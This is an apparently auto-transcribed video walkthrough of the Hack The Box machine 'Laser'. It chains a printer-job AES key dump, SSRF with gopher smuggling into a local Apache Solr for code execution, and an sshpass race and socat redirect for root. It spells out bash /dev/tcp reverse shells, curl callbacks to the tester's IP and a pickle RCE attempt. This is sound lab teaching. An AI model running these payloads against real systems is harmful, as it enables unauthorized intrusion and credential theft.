 what's going on youtube this is ipsec i'm doing laser from hack the box which was an insane machine not only because of how difficult it was but just how amazing and well everything flowed together it starts off with finding port 9100 which is a common printer port and you can use a tool such as the printer exploitation toolkit to dump a cued print job off of the printer and then you discover it's encrypted however the toolkit also lets you dump the nvram which is the memory so you can extract an aes key from the printer to decrypt the print job that print job is just a pdf that explains how another port on the box works which is essentially just an api you can have that api and perform web request and using server side request forgery you can make it curl your own box and then if you smuggle in protocols using like gopher you can also make it do a post request which comes in handy because apache solar is listening on localhost and in order to exploit that solar instance you have to make the box do a post request and to do that post request you have to smuggle in the http exploit via the gover protocol it sounds like black magic but hopefully it'll make sense by the end of this video so let's just jump in as always we're going to begin with an nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it laser and then the ip address which is 10 10 10 201 because i'm not the root user i'm also going to run this with sudo however it can take a while to run so i've already ran it looking at the results we have just three ports open but oh man there's a lot of data down here so this data is just because nmap couldn't identify the service and it's giving us the fingerprint so the very first port we have is ssh on 22 and it tells us it's an ubuntu server then we have this cs listener with a question mark so nmap's not positive it's on port 9000 and we can see the fingerprint says uh 9000 tcp so i'm just looking at this and i do see http so i'm going to quickly just see if this is a web server so i'm going to do curl 10 10 10 201 port 9000 and we get received http 0.9 when not allowed um i'm going to try net counting to it so nc101010201 9000 uh it's a space after that and we just get uh two ats and a question mark going back to that curl that says uh http 0.9 we're not allowed i'm gonna see let's see hdp 2.0 curl can i do this quickly let's try oh we'd have to compile a different curl binary for this i think we can see if it exists as a dash dash http 2. and does that do anything we give it a bad argument says unknown so um it's getting a different version of http than it expects or maybe that's just curl giving a weird error message i don't know anything about that port so let's move on to the next one on 91 000 and it says jet direct this is a printer port so let's try connecting to it and just seeing what happens so let's go back to our netcat and do 91 000 uh can't really get anything so i'm going to do um nmap dash p 91 000 dash dash grips von maybe uh 10 10 10 201 is it script there we go and while that runs i'm going to download pratt so github prep this is the printer exploitation toolkit and the reason why i just did that nmap in the background because i always like doing something in the background as i'm working so i figured i'd show running a different nmap script we probably should have ran that with sudo so i'm gonna rerun that so let's see we can go get clone and download prep and then let's see how we use it so it looks like we do pratt the target 10 10 10 201 and then either ps pj l or pcl these are types of um printers like ps i think is postscript uh let's do dot slash print did it say um postscript ps uh printer language yeah i'm not sure exactly what all them stand for so it shows um we got connected and then nothing happens printer busy non-ps or silent so i'm going to try the next one which is pjl and it looks like we got something and our n-map volume script finished nothing actually happened so i'm just going to exit that and print gives us a bunch of commands so we can do id and we get laser corp we can do like ls and we can see directories so it looks like we got everything working um ls pjl and then there is a jobs directory in pjl it looks like maybe this is a print job and we have a cue job so blue means folder i'm guessing so since this is not blue i'm going to do a cat and we get a bunch of data so i'm going to copy this data man that is a ton of base64. and we're going to save this to a file i'm sure prep probably has an option to save to file um i'm going to do maker loot make the printer if i could type well i know i typed that that'll probably bite me later on in this video that typo spelling printer so that is pasting down there i believe so while that goes let's go back to that ls and see if we can get the other job so 172199 and file not found so we have this base64 now let's decode it so base64-g job and then we'll direct this to justjob if we try to less it it says it may be a binary file so i do a file command to see if i can identify what exactly it is and it just says data so there's no magic bytes in it to tell us what it is i'm going to do an xxd to look at it and see if we see anything uh it's not looking promising let's run strings against it and again nothing's looking promising i'm going to run ent to check the file entropy of this job and we see 7.99 so that is super close to 8 which means it's going to most likely be encrypted another thing we could do which i'm going to do a lot in this video is use cyber chef and cyber chef has a lot of these tools for us so we're going to say from base64 and the reason why because we don't want to send like binary data all these like dots don't go in the clipboard too well that's not really a period that's just saying it's not ascii i can't display it if i try cutting this file it just yeah destroys my terminal so that's what i'm gonna do through the base64 so i'm going to do um x-clip dash i job.b64 selection i think primary do that copy nope that's not it um maybe selection clipboard there we go so now we got base64 and the outputs down here so we can now search this for entropy i probably should make it bigger uh i did and then this graph showed and this is kind of showing what it is um standard english text falls somewhere between 3.5 and 5 right here and properly encrypted goes 7.5 and above so this is going to be encrypted or compressed so there's nothing we can really do here but printers can um encrypt things obviously so if we go back to pret let's do pret uh is it dot slash pratt uh 10 10 10 201 pgl so we can go in the config so we'll show show question mark help shell show help show nothing uh is it info okay info um i'm used to like cisco command lines where you always type show and things but in pratt it is info so we can look at various things like info config and we can see the config info filesys and just take a look at this info id info memory um let's try info page count and this would be helpful if you're trying to monitor a printer and you can see when people start printing jobs and that's when you should go look at it because this is the number of pages printed uh info status just tells us what the lcd says i believe this is the lcd display info u status not sure exactly what that is info variables and here's the thing we're looking at this is in encryption mode aes cbc so um counter block cipher i believe is what cbc stands for but um cyber chef is going to help us here so if i just type aes we do have an aes decrypt function we need the key the iv the mode is already cbc so and a 16 byte key is going to be aes 128 24 byte aes 192 and 32 byte aes 256 so we gotta just figure out which size key this is so let's go and dump the memory so pret does allow us to do nvram dump i think we just do help nvram it says what it has but we can do envy ram dump and it's dumping the memory and we got key and then it paste this so right after key we have this string so what i'm going to do is look at this we can do uh cat key then wc-c it's 19 so it's 18 characters and a line break if we got rid of the two periods it would be 16 characters so let's try that so let's go and copy this as the key and we're going to say utf-8 so copy this so now we have a key we need a iv so we expect 16 bytes as the iv so what i'm going to do is where am i let's go back into loot printer and we're going to trim up this file so if we do xxd job i'm gonna do head dash five we can see what this is so 16 bytes is going to be an iv iv is initialization vector it should be a randomized number and we see a lot of null bytes here so chances are this is not an iv iv generally begins at the very beginning of a crypto block and based upon this i'm going to guess this is some type of size so we want to trim off the first um z8 8 bytes actually so i'm going to do dd job uh dd input file job um we'll just say block size is equal to one and we're going to skip eight and output file job dot trim maybe let's see open file equals job.trim so let's do this xxd on job.trim and make sure it begins with ce88 it does so we want to grab the iv and the i've we said this was eight so two four six eight so two four six eight ten twelve fourteen sixteen so we wanna grab this this is the iv so what i'm going to do is say um input file job.trim block size 1 skip 16 job dot iv okay and we want to do um wait we don't want to do skip we just want to do count is equal to 16. so now we only did the first 16. so if i do um xxd job.iv we have the first 16 bytes of that file so now what we have to do is create the rest of the job so we're going to take the iv out so i'm doing skip 16 job.data and this should begin with um maybe attribute 17 because zero e i think is um a terminator so i think that's determining the iv string so if we get an error message we're gonna change it to 17 because of that zero e um i could be wrong there head dash two so yep we begin with zero e so let's do our x clip again do i still have that we do so let's see i'm going to cat job.iv x clip selection clipboard uh we're going to base64 job.ib actually and we can say paste and this is base64 data so we're unable to decrypt with these parameters and that's because we have the um size and iv in here so what we're going to do is go job.data grab this and let's see what we get unable to decrypt let's see so i think maybe we should try um skip 17. like that grab that paste and it's not working let's see from base64 that looks good it's unable to decrypt so let's see what do we have plus xxd job.data head dash 2. and this is why i like doing it in cyber chef because um it's just gonna make life easy instead of playing with the python script um it's much quicker in my opinion for doing these type of decryptions so let's see [Music] job.trim what i'm going to try doing is just we'll go back to job and we'll say block size is equal to one skip is equal to 24. this is going to skip the first eight bytes which is the what we call the size then the next 16 which is the iv and we should be back here base64 job.data x clip selection clipboard paste see it ends in ssq see base64 job data that's how it ends dq p6 dqp6 input hex uh let's try changing it to raw and oh there it goes so i don't know exactly what this input thing is i wish they had a question mark that says exactly what it is but we have it now decrypted so let's now copy this out we can either save the output to a file or you can also um convert it to base64 and then that's from uh to base64 and copy and paste out um stop that one so it's up to you how you want to do it i'm just going to save it and we'll call this um this looks like a pdf so i'll call this job.pdf save it probably saved in my downloads so cp downloads job.pdf just going to move it and now we have to open it so let's go to places and i can go home ipsec um hdb laser loot printener and we can look at the print job so we have this right now picture and it looks like it's showing what this server is so we have feed engine printers the cloud web servers embedded devices and they all go to feed engine so description this is used to pass fees from various sources printers network devices web servers and other these feeds can be used to check load balancing health status and tracing so going to the usage it's using protocol buffers and the grpc framework which is the google remote procedural call and it uses protobuf to send and receive data um i believe this is http 2 so that's what i was trying to play with the engine runs on 9000 by default all engines should submit feeds in serialized format such as data transition um so clies to make it fast they define the print service which has a rpc method called feed the method takes content as a parameter and returns data from the server so this is the um key piece right now we'll probably want so i'm going to do v or let's be notes and we'll paste this on successful data transmission you should see a message that says it is pushing feeds and service underscore pb2.data this looks like python code uh sample feed so i'm going to copy this and we'll just put it here it doesn't look like it pasted well it's a pdf so of course it won't qa with clients see so this looks like they have some type of defense against pickling and going by python before um they don't use built-ins or under other modules so maybe we can't just de-serialize something with pickle bugs nothing really too interesting and to do so we don't have all that much information right now what we do have is stuff to make a um request to that port 9000 and once we have the request to port 9000 that's when we can start playing with things um you can also google like python grpc and i recommend reading these guides um probably maybe this that's a lot um probably this page would be good but we're just going to jump through this quickly so let's see we first have to make the protobuf message so i'm going to call this um grpc i guess and they called it service if we go back into documentation um they had service underscore something so service underscore protobuf 2 is what it stands for so i'm going to call it service.proto so we kind of just mirror what they're they are saying and the start of it begins with syntax is equal to proto 3 and then looks like we chopped off on something why is this not moving up there okay okay so they defined a print service which has a rpc method called feed so the print service let's do service print and then we want to do rpc feed and it takes content as a parameter and returns data okay and then the next thing we have is to define content and data so message content and i'm just going to say string data equals 1 and then we'll do the same thing i can type there we go and this time i'm going to say instead of message content we can do message data and string feed equals one and that looks fine clean this up a little bit and at this point you want to install uh grpc io tools so like pip3 install geopcio dash tools but i already have this installed and that's going to give you a command let's see i don't know this one off top of my head but it is in one of these pages so it's the dash m command for python python 3 dash m set here python 3 python dash m so this is what we want to do and we'll go over this as soon as we copy it i always specify python 3 because i think my default is 2 still in this os always better to define the version so we're using the module grpc underscore tools.protoc dash i is going to be include and i'm just going to do the standard folder and then we have a python out this is going to be where it writes python files and again where it writes python files and next we have to have the name of the protobuf file which is service so now what that did was it created service underscore pb2 and pb2 grpc so if i look at these files they're just python libraries so we can use the protobuf2 stuff so now we want to um let's see if i can use codium for this so new file it's going to do um touch exploit.pi file open and we'll do where's laser grpc exploit.pi okay so i want to do my imports the first one being geopc itself so import grpc then the next thing we want to do is probably import service underscore pb2 and then import service pb2 g or pc um we'll probably need to do request potentially so i'm just going to import that just in case i need it i don't think i do maybe i do um and now we got to open the pro buff channel so channel is equal to geopc dot insecure channel this is going to go over not https 201 port 9000 and then we can do stub it's equal to service like that dot print stub channel and now we want to send data so we can say response is equal to stub.feed service content and we'll say payload and we should create payload is equal to test print please subscribe see there we go uh f5 python file is this gonna run uh for some reason this is the error message i get sometimes when i do visual studio code and this vm i don't know what i did to deserve that one so um i'm just gonna run python3 exploit here and let's see positional arguments allowed let's see stub dot feed service pb2 dot content oh we give it the data um where is this uh this content returns data i think that's correct now nope wait did not save okay so now we have a message exception calling application invalid load key so let's see what this error message is and i'm not going to do visual studio because that's now giving me issues let's see so this is a pickling error so let's try to pickle this um very first thing let's um try a decelization attack so i'm going to do input pickle and then we want to do class and i'll call this please subscribe def reduce self and i think we did this in canopy um return os dot system and we'll say curl 10 10 14 3. and [Music] i think that's good so now we can say this data is equal to all right payload i'm going to do pickle dot dumps like that and now let's send this and see what happens uh has type string but is not valid utf encoding so at this point let's try base64 so import uh for say from base64 import b64 in code and we can encode the payload so b64 encode payload and let's see exception something happened expecting value one line one column one see let's do pickle dumps i forgot to change this to our rce so we can say pickle dumps we'll say please subscribe and we should do nclvmp on 80. because we have the pickle command as a curl so if we get code execution it's going to curl our server os is not defined um maybe put pickle os and we get module is disabled so it doesn't look like we can um do that type of exploit for this so in the pdf they had mentioned and the qa they place controls around what gets unpickled and they don't use built-ins so the next thing we probably should do is try taking a um this json data so let's grab this and we'll send the sample to the server so let's say um def gen payload and we'll say json is equal that is messy eh maybe it'll work we don't need a variable return json so we're going to try to um send this json string so gen payload uh must be string or bytes not so let's see i wonder if put this in quotes will that work and something's happening we're not really getting a response back and let's see could not resolve host printer.laserinternal.htb if we look at this we do have homepage and feed url here um what i'm going to do to try to make this easy is we're going to copy exploit to exploit dot back and then i'm going to delete some of these json keys because it would be nice if i don't have to have this whole payload in every request so let's take feed url do we still hang we do awesome so let's try changing this to be 10 10 14 3 which is my ip address we still hang and i don't see a request so let's try the feed url 10 10 14 3 and we actually get a hit back so now we have the server downloading something from us what we could try doing is i'm going to add a k and what the k did was it's going to keep the socket open so i can do multiple things we can now exit the notes we don't need those anymore we can try like basic command injection here so who am i like this and run the exploit doesn't look like that works we can try putting like backtext nothing works um we can see if we can do other feeds so 443 so we can do https let's see is 20 one ftp let's try ftp does that work it does so we can do various things um this is python so i don't know if there's anything we can really do in order to um get this to download and execute code the one thing that's generally good to do whenever you can make a server make a request is see if you can make it make a request against itself and do some type of port scan so let's just try http localhost and see what this responds with so python3 exploit and we get failed to connect connection refused if we try localhost um it was listing on port 22 for ssh uh let's see received http 009 when not allowed so now we definitely know we can do some type of internal port scan on this guy so let's see um locate top 1000 is there an nmap let's see and map top 1000 ports looking for that list file see that's top 100 so google top 1000 okay let's just do all ports um this is gonna take a long time to do probably so we'll do the first ten thousand so let's go to exploit.pi and we'll probably want to thread this so the first thing is to clean up the code a little bit and then be able to identify when a port is opened or closed so there's that let's say gen payload port and we can change this to b port and this has to be an f string okay one two three four make four lines go here and we'll rename this to be checkport i think that is good so far and we can return response and we can say try this this and say accept exception as e and we can say return e let's see what happens here so let's do checkport if 22. run this we may want to print gen payload is not defined so this is just going to be json now okay exception calling application something happened see what if it doesn't like let's print json real quick yeah it did not put port like we thought it would um because now this whole blob is a string so we put the format string there valid format specifier let's see feed url plus port there we go try this okay so http 0.9 we're not allowed so let's see if http and e return open else return closed uh let's see not iterable see we convert it to a string there we go so now let's try um i'd say 9 2001 but is that no no it's 9 100. so now we have a way to tell port open and closed so we should be able to now script this out and a thread and check a bunch of ports at once so to do that i'm going to import another module the concurrent.futures so import current dot futures okay if you're confused what i'm about to do um it's pretty much the code off of um what is it zetta yep this is pretty much what i'm gonna be doing so let's see with concurrent futures thread pool executor max workers is going to be i'll say 20 people threads the jobs we have for report and range zero let's do [Music] ten thousand jobs append executor dot submit check port and port okay for future and concurrent futures as completed jobs port output is equal to future result print port i'll put see there's no way this works first time uh let's see return i'm returning the port first so we'll say port like that um port unknown uh concurrent has no there we go so you can only concatenate string not int let's see port equals str port sweet so now take that out there's no way it's going that fast where's 22 it is um let's do 30 threads and direct this to result so let's see if this actually finishes quickly um i did t so it writes it to the file as it finds it alternatively i could have had like python start dumping this to a file but t is the quicker way to go we're seeing a bunch of things closed um 22 is open so it is promising that this is actually working um we'll find out i guess if there's anything else open we should see like 9 000 open but it just jumped past the screen so i can grab open on result and we have just two port there are three ports didn't give us anything else but i guess it is fast enough where we can make it take about um a little longer so i'm gonna run this and we'll see what happens and now it is done so let's grep again and i'm going to try just saying everything that's not closed we have a few ports that are unknown 8983 and 35821 so i'm going to manually look at that and see exactly what that error message was so cp exploit.pi i should have called this checkport.pi or something we'll have to modify exploit later but we can comment this out um that whoops some reason this vm doesn't like my escape key it's happened more than once this video and previous videos so check port and we want to go 8983 i think it was and here we can just say print response python3 check port and we didn't specify oh we did okay it just says pushing feeds so i don't know exactly why but the program did not error out so i'm guessing that port is open and if we go to google uh port 8983 see we see it is solar this is an apache product so the very first thing i do apache solar exploit to see if we can do some type of like protocol smuggling and send an http request to this and exploit it through this service side request forgery the server side request forgery is us making the server make a request and looking at this does not look like it's going to be trivial so if we look at the requests um i would love to be able to identify what version of solar is running on this box or even if it's solar to begin with but this is kind of blind we only can tell booleans so this is a long shot um but when you have services listing on localhost it's not out of the ordinary that they wouldn't be updated so this is doing a post request in order to do the post request we have to do some type of protocol smuggling because we can only make the server do a get request so if i did 80 and we go back and edit this check port i probably have it up here uh yeah it's doing get requesting so we have to make this do a post and we already know we can make it do things other than http when we tried with https and ftp there's another protocol called gopher which is super common for smuggling things because you can just write raw data to it um so i'm going to go back to cyber chef and this will be probably more obvious once we do this so let's clear a recipe and we want to send post please subscribe um was it http 1.0 is that a http request let's see 1.1 and then we do like um host localhost 9001 i guess it doesn't matter what port i just want to show we can actually write data content type application json invalid header and we want to write something like that so we can convert this to url and let's try doing this gopher thing so nclvnp i'm just going to do on import 80 and let's see gen payload we can say payload and let's see http so we can say this is going to be gopher localhost 80 and then payload so let's say that plus payload that looks fine return json say channel stub um i don't really want this i just want to see everything print response okay we'll say payload is equal to gen payload that okay so if we did this correct what's going to happen oh i already had everything down here um when it connect to the rpc service get ready to send data we're going to have this craft us a malicious json which is going to do gopher um we want to send it to us right now so 10 10 14 3. awesome port 80 and then girlfriend begins with the slash and then anything after that is going to be just written to the socket and we're just writing this to the socket so let's try python3 i could still call it checkport uh the names of these files are going to be horrible so we can see um we connected and then we are just writing raw data to the socket that we connected and this is us setting a post request via gopher um if you want a good article uh orange sci smuggle i think let's see yeah this is a good one uh he mentions like black cat talks and things like that uh highly recommend if you're confused what i'm doing watch that because that's the best resource to learn this type of smuggling so cp checkport we're going to call this exploit now because it no longer checks the port so let's see so we have to go back to this solar thing and figure out exactly what this is sending so uh try json dumps payload so it's sending this so we have to send this payload and we got to get the correct url so we're cyber chef we want to send this and i'm going to put this all on one line just so it's easier for us to um deal with i don't think we have to because we're url encoding it but again um i think most situations getting payloads to be as small as possible with as many like random bad potential bad characters is good so i think that is correct so to send a post and see what this url it's sending to is uh where is this i'm just going to clean up my tabs okay so net node so we need self you dot url uh http ip port solar node a node see admin cores oh i remember what this was um this was one of their long shots um merge staging core to feed engine this is actually the um hint at there's a staging node inside of solar so the actual payload is going to be solar staging and then where is the exploit i think config we said so solar so staging slash config where is i get used to having cyber chef not as an application so there we go um the port was at 8938 this doesn't really matter uh content type we don't want to send invalid header uh content length i don't think this is needed but i mean it's something that we should always put echo dash n let's see it's not using double quotes wc-c 215 okay so let's try this and our payload like that and this should still send it to me python3 exploit uh invalid syntax let's do a double quote and hope it doesn't interpret anything okay so now we're sending json data so let's do uh and what this piece the exploit is doing it's just configuring this piece of solar to be vulnerable so we don't do any actual code execution yet but that is coming so 10 10 10 201 8 8938 we can run this [Music] see fail to talk to port the checkport do i still have it uh grep unknown result a983 b exploit eight nine eight three and i will oh god host localhost 8983 there we go let's run this fail to connect 10 10 10 201 8983 oh um we're doing localhost localhost there we go so we're not getting a response back but it's probably doing something the other thing that could be happening is we may not put a line break at the end of our http request in that case like the http request could just never be completing so we have some things we have to play with there if you want to be sure that wasn't the case you could go exploit to and we could change this back to us and say 10 10 14 3. python 3 exploit 2 and stood a web server and make sure it makes a post request um 8983 and since it does make a post request we know our http request is fine so this should be fine let's go back to exploit dot pi and this one should be good actually we now need to since this one hangs i'm actually going to use exploit 2. change this back to localhost and we're going to see if we can get the code execution piece so that will be the next piece localhost and if we go back to this solar request so this is getting the um node and this is system so solar admin info system that's not it okay rce a net node this is doing the configuration to make it vulnerable and then here we're doing a command so what i want to do is i'm going to open up a new cyber chef window that's it cyber chef and paste this and we want to url decode this real quick it's just easier for me to edit this way okay so we're gonna get rid of all these quotes and put this on one line and be cognizant that these end with a space so i think i'm doing it correctly uh that's not ending in a space i don't like this um let's see maybe just copy it line for line okay um i probably could just say this this would be quicker speed let's see b d dot pi paste uh string is equal to this uh self command we'll say execute code here print string there we go python 3 t dot pi there we go that's much better so we can copy this and actually let's just you'll encode it i don't know why i did that convert it back and we'll send this and our exploit two so let's see payload and this is an actual http get request so we don't have to do this gopher thing so feed url this can be http localhost where is it going this one is self.url it's not the same thing right http port solar node so solar staging and let's see and let's go back and the end of the url it's actually doing select question mark so we have it if we i don't know why that just decided to copy if i paste there we go there's no single quotes so that should be good and payload is equal to that and let's see execute code here let's do plus payload plus that there we go solo staging payload i think that's good so this will no longer be all of that this will be a command so we'll say curl uh 10 10 14 3. i don't know if i have to url encode this or not let's try not first okay let's see if this works python3 exploit two one port 80 pushing feeds nothing so let's run exploit.pie python3 exploit two we have to go into grpc python3 exploit two dot pi and nothing's happening so i'm guessing it did not work so v exploit two dot pi and what we're going to do is put a plus here so now it's url encoded and i'm always running this config thing first before i do this did not work so let's see let's print payload see what it sends so looks good we can try percent 20 instead of percent uh the plus i don't think that matters but it's always good to try the easy things before you go and try the hard things so we're still not getting anything let's take a look at the whole json string so let's see print we can say json and how is this looking localhost we have two slashes i could do it maybe so json staging plus payload let's rerun this that didn't do it it could also be our very first exploit that is failing it could also be there's no curl in this box there's a lot of things this could be i am 10 10 14 3 right yes so 8 9 8983 solar staging payload let's see what i'm going to do is we'll just hard code everything now we don't have to do that that's definitely working as expected see run this exec curl yeah that's definitely working i know we can get to our port 80 because we did it through just regular http before we just haven't done it through this code execution let's see if i change something in this exploit.pi let's see solar if we had the new name wrong if it wasn't staging does still hang it does still hang see if we have solo wrong it hangs so it could be in this piece of code that we have the mistake i was taking it just taking a while to be um working let's see content writer content type so 7b so i think this is the bracket yeah 7d is closing what if we have to put like single quotes before and after it that wouldn't make sense let's send this to cyber chef and see what the json looks like uh we don't want to edit anything exploit.pie uh we did we have not solar still uh not delete that delete that and let's copy this and see what you look like uh do we have it here i think i already had it i think this is it yeah we'll be sure decode and let's see oh i think i'm forgetting a bracket we have one starting here and only one there but yeah there's an unbalanced brackets percent 7d let's try this let's add that percent 7d and exploit.pi and see what happens percent 7d there we go python 3 exploit.pie that goes really fast now um do we screw something up localhost 8983 solar staging let's see python 3 exploit 2 dot pi still not hitting us see feed solar 8983 we're doing a curl let's see let's just redo this whole piece let's see where is the json blob sorry for all the scrolling there it is so that was my mistake i just grabbed this i did not grab this so let's go copy paste oh um i probably kind of just added that at the very end i wonder if i need like a 0a percent 7d yeah we'll just do this let's see can we do like online json pretty formatter invalidator see there we go paste okay solo staging config echo dash n paste wc-c 206 and we want to encode okay now we can try this maybe exactly what we did python3 exploit.pi it's taking longer so exploit two still not working this is a painful exploit if you can't tell whenever you do protocol smuggling things just don't like working 8983 solar staging should be calling back to us see let's get rid of this format string is that changing anything it's not see payload do curl plus nothing we can try w get and get rid of the plus and just do a space but i feel like that's going to break all sorts of things see let's make this get a request to us actually so payload feed url let's go 10 10 14 3 and we want to listen on 8983 okay what does this look like does that really stop uh what 8983 is that just my python web server stopping no it stops after custom that doesn't look right uh what is custom see doesn't like that end so select question mark we probably have to url encode all that let's see let's go back to cyber chef url encode all special characters so instead of w get let's just do execute see if this is any better just add a k here okay that looks better whereas execute plus payload there we go and the feed url we want to go back to localhost and we'll say curl run this still nothing let's see what if i should just encode the ands because now i may be encoding like the equals that we don't want maybe it's best not to use cyber chef here let's just try rebuilding that url completely so let's go python3 p dot pi if you remember what t dot pi was that was just us copying the code out of the exploit and bring it here so let's go back to exploit two and paste this b exploit two dot pi uh it's in cd g opc v exploit two dot pi and we can delete this paste okay so execute code here this is going to be our payload plus command plus let's see let's do single quotes instead of double well that could have been it i wonder if i was doing double quotes okay so let's just try this leave it with that python3-m okay python3 exploit two dot pi command is not identified we're going to payload still nothing see feed url let's make this one come back to me so http 10 14 3 8 9 8 3 is it still going to stop no that's good so at least we solved that problem of it stopping like right here i think that was because that wasn't and so curl let's see so we go back change this to localhost i can't believe this has given me so much issues localhost i really have the feeling that it's gonna be something super super stupid and it's gonna cause me to want to redo this whole portion of the video but i feel like the troubleshooting may be valuable to someone okay exec payload print json let's run this again so a json validator we can use json formatter and validator okay it says valid so it looks like our encoding is fine solar staging select see we open the channel yep gen payload pickle dump base64 okay that looks all good see i wonder if we can like sleep 15. i was hoping it would take like 15 seconds to return and then we can verify it's just like doesn't have curl doesn't have w get and it's weird like that but that doesn't seem to be the case let me try sleep plus 15 but oh that's promising so did i just work let's try curl again i don't know what i did girl 10 10 14 3. there we go we finally have card execution so i don't think it likes the percent 20 was that it really was it the plus percent 20 does not like that space does not like that so yeah it wanted a plus for our space so it's probably a combination of us having bad json and the very first exploit this one right here to begin with because i did try changing to a plus and then after that um what hold on okay make sure i'm not crazy run this okay so yeah um it was probably a combination of um the very first exploit having bad json so now that we have code execution let's see we can curl let's just drop a file to disk because it'll be easier so make dirt dub dub dub and then v shell.s8 bash uh then bash do bash dash c bash dash i devtcp 101014 3 port 9001 there we go there we go nc lvmp 9001 so we can download this real quick dasho dev shm shell.sh run we have downloaded it twice i'm not sure why but let's see if we can execute it dev shm shout out sage uh probably need a plus there we go about time we have a shell on this server uh we are the solar user so what i'm going to do is go in my home directory and i think there's a dot ssh i'm going to put an ssh key here so let's um do sh dash gen let's go up one directory dash f solar cat solar dot pub and let's echo this into the file to authorize keys okay sage mod 600 solar and we can clean all these shells up sh-i solar solar uh what cat solar cat solo.pub let's do rm authorize keys echo dash n authorized keys chmod 600 authorized keys okay i don't know exactly what i screwed up before but now we have a proper ssh session into this box the first things i like looking at before i even run lin peas or anything is like what groups i'm part of what the sudo rule is was the aux dash force maybe the process is running on this box so we can see this one is me we have a reverse shell which is me um let's see home solar feed engine so i'm going to go into this directory and i'm also going to let's see sudo dash u printer that's running as root so this is probably setting up the 9100 emulation printer is running this script cat opt updates run.sh permission denied that script just does sleep 10 so if we just kept running this force command let's see um grep 2608 grep run.sh and we can say [Music] dash a1 uh maybe a2 i was able to get the sleep maybe 1688 all right let's just grab run.sh a2 watch so we watch this command we may be able to see like this um sleep run different commands so we can see right there off the bat oh man um run.sh did ssh pass so if we wait again um i actually did not expect to see it like that um i was expecting to have to run like uh ps buy or something but we're just gonna let this go and every second or every two seconds let's change this to uh can we do like dash and point one so we can see what this script does uh sleep ten so what i'm going to do is instead of the watch 1 because that's um clearing a terminal i'm going to do 4 i n sequence zero to an insanely large number and then sleep point one done see we've got to do do and i can get rid of this quote and that group and let's see two temp output okay sh-i solar solar at 10 10 10 201 cd temp cat output so now we can do this we can grep for ssh p and we can see that ssh pass now i don't think that's the password of all z's but we can try that we can also grep for ssh pass and grab v disease to see if there's anything else there isn't but we can try logging in with this so ssh pass dash p z's uh update i don't know where that's copying to in this four command why don't we just get rid of this grep and just do the ps command and then we gotta wait 10 seconds and 10 seconds um we'll definitely probably guarantee this sh pass ran because it said it was happening every 10 seconds okay grep ssh pass output and we can see it is going to root at 172.18.02 so we can see everything that's happening but we still have this issue of only seeing z's but we can try logging in to see if this works we get permission denied so ssh pass does have um an ability to like overwrite this variable so it's kind of like um process spoofing in windows where after it runs it goes and it clears out this so let's see password so doing dash p let's see sh pass hide password standard n uh i know there's still a vulnerability with it so i'm just gonna try running piece by real quick so we'll try piece by first and then if p spy does not get this then we're going to try to create our own version and when we create our own version we'd just be going through the proc table to see if we can find any artifact that shpas does not overwrite so again it's going back into kind of its memory how it starts to change up its command line um so let's see w get 10 10 14 3. was it pspy64s and we have to start that move downloads to p spy 64 s c h mod plus x see what this says this may be a little grab it um this is just a crappy like bash loop which may not be fast enough to grab it before it overwrites so this could be better see grab sh pass output cd temp drop ssh pass output cut output graph i sh v z's so we don't have anything there let's see sage pass nothing still all z's see dash h we can try changing the interval so default is 100 milliseconds let's change it to 10 and see if this works so we're just waiting now for the 10 seconds to come and to run everything again and just looking back at ssh pass i think i saw all z's yet again so and try letting it go one more time and then let's look at ssh pass no no no no so if we can't get this through peace pie uh oh there we go um finally so we have it going right now and again all it does uh ssh pass um in this option it's going to just overwrite the memory and take whatever length you have and replace it with zs however there is a timing condition where you can get there before it actually does that and if you do you get this and you can see the password so we can do sh pass this and root at 172 1802 so root at 172 1802 and if we do ssh pass correctly fail to run command maybe we'll just do bash um that's just ssh ssh root at 172 1802 put the password and we'll root in this container so there is a feeds and we can look at these files so api v2 uh looks like um serialize content uh back in here it's getting data from various places and going to the feed engine so that's what i'm guessing this is so if we look back um it's probably in temp output um cd temp cat output let's see grep ssh pass and let's do last capital s to disable line wrapping so we can see what it does it's going to scp a file over to 172 18.0.2 and then it's going to try to execute it so what happens if it tries instead of going to 172 1802 every 10 seconds if it actually goes back to itself and because we are root on that container we can actually do that so um looks like the container closed just over my clipboard can i plug in okay and we can do that because we're a root and we can just turn off ssh and by turning off sch we can download a static binary so static socat binary and download it save it to file and let's move downloads so cat to dub dub dub and go into dub dub dub and we can download socat so wget 10 10 14 3 slash soca and that should download it if we're listening so python 3 dash m http server80 so we'll run it and then once it's executed it looks like it already existed so we can do dot slash socat and it requires two addresses so we can say tcp listen on port 22 uh fork reuse address and then tcp 172 1801 port 22. so now the server is pointed back at itself so when you try to ssh we're going to get this host identification failed but if something funky happens and maybe they just accept it we may get logged in so let's do v clear.sh and bin bash and i'm going to do c bash dash i dev tcp 10 10 14 3 9 000 1 0 and 1 ch mod plus x and nclvnp 9001 so we're just going to wait here and i'm going to make a backup of this file in case we have to okay so i can do watch dash n one cat cleared rsh and i just did this to see if this file ever changes its contents so hopefully um it'll pull this and execute it i'm not 100 positive but we'll see oh there we go so now we have it and we are root on this box if we go dot ssh i want to play with this real quick so we can control c out of this cat ssh authorized keys and we're going to copy your key to this box the authorized keys ah shoot did i just do that did it right we'll see um we can exit this shell and we can say solar at root hey it did sweet so i want to try something ssh root at 172 1802 who am i so i don't know exactly why this is happening because it didn't happen when we're the solar user right when we're solar sh um dash i solar solar at 172 1802 uh 10 10 10 201. if i take this command and run it let me get permission denied so what is happening here cat sh config there is no config maybe it's a idrsa file ssh cp id rsa and authorized keys to solar sh solar sh ch iron solar solar now we have to do that bind again grab this password paste we can socat service sh stop okay so it looks like um maybe because keyboard password authentication is disabled even though this host identification has changed it's still um working let's see it's possible see zero two yeah so even though that prompt's coming up nothing's happening i'm not a hundred percent positive what the configuration on this box is but yeah um it's just telling us the host key has changed and then saying i don't care i'm just gonna go log in so this idrsa file in here is duplicated on this docker container um i think or it's not duplicated but there's the authorized keys so that idrsa can log in so i'm guessing this key is in that docker so aaab 3 it ends in wxm less maybe it never logs in successfully to begin with but yeah that's what's happening um weird behavior because yeah but hope you guys enjoyed the box take care and i will see you all next week